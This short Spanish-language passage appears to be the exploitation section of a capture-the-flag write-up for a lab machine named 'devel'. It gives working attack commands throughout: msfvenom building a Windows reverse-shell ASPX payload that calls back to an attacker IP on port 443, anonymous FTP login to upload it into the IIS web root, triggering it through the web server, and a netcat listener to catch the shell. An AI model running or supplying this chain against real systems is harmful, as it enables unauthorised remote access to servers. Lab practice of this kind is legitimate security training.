Explotación

Acceder al FTP anonymous y subir rev_shell

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.17.227 LPORT=443 -f aspx > exploit.aspx
ftp devel
# user anonymous
# pass anonymous
put exploit.aspx

# En el sistema exploit.aspx se almacena en C:/inetpub/wwwroot
# En la web se aloja en http://devel/exploit.aspx
sudo rlwrap nc -nlvp 443
